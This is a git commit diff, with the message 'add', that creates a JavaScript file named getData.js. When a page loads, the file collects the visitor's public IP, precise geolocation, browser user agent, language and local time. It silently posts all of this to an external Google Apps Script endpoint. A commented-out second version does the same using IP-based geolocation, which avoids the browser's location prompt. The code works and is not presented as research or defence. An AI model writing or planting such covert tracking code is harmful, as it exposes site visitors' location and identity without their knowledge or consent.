578057445b8dffb0f145b660cc534586082f9deb
sajid-mohammad <50070023+sajidinfo@users.noreply.github.com>
2025-10-08 12:19:46 +0530

    add
    add

---
+++ assets/js/getData.js
@@ -0,0 +1,72 @@
+        async function autoSubmitForm() {
+            const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+
+            navigator.geolocation.getCurrentPosition(async function (position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                const formData = new URLSearchParams();
+                formData.append("ip", ipData.ip);
+                formData.append("userAgent", navigator.userAgent);
+                formData.append("language", navigator.language);
+                formData.append("timezone", new Date().toLocaleString());
+                formData.append("latitude", latitude);
+                formData.append("longitude", longitude);
+
+                try {
+                    const response = await fetch("https://script.google.com/macros/s/AKfycbzYWKmICz_bsmnmHhcjSnqIYtPZ72hEBi5n2pAJAwyxyrrzgdvuiuR3kEkuv-BYNgQF/exec", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/x-www-form-urlencoded",
+                        },
+                        body: formData.toString()
+                    });
+
+                    const result = await response.text();
+                } catch (error) {
+                    console.error("Error submitting form:", error);
+                }
+            });
+        }
+
+        window.onload = autoSubmitForm;
+
+
+
+
+
+
+
+
+
+
+
+//         async function autoSubmitForm() {
+//     // const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+//     const ipData = await fetch("http://ip-api.com/json/").then(res => res.json());
+
+//     const formData = new URLSearchParams();
+//     formData.append("ip", JSON.stringify(ipData));
+//     formData.append("userAgent", navigator.userAgent);
+//     formData.append("language", navigator.language);
+//     formData.append("timezone", new Date().toLocaleString());
+//     formData.append("latitude", ipData.lat);
+//     formData.append("longitude", ipData.lon);
+
+//     try {
+//         const response = await fetch("https://script.google.com/macros/s/AKfycbzYWKmICz_bsmnmHhcjSnqIYtPZ72hEBi5n2pAJAwyxyrrzgdvuiuR3kEkuv-BYNgQF/exec", {
+//             method: "POST",
+//             headers: {
+//                 "Content-Type": "application/x-www-form-urlencoded",
+//             },
+//             body: formData.toString()
+//         });
+
+//         const result = await response.text();
+//         console.log("Success:", result);
+//     } catch (error) {
+//         console.error("Error submitting form:", error);
+//     }
+// }
+
+// window.onload = autoSubmitForm;
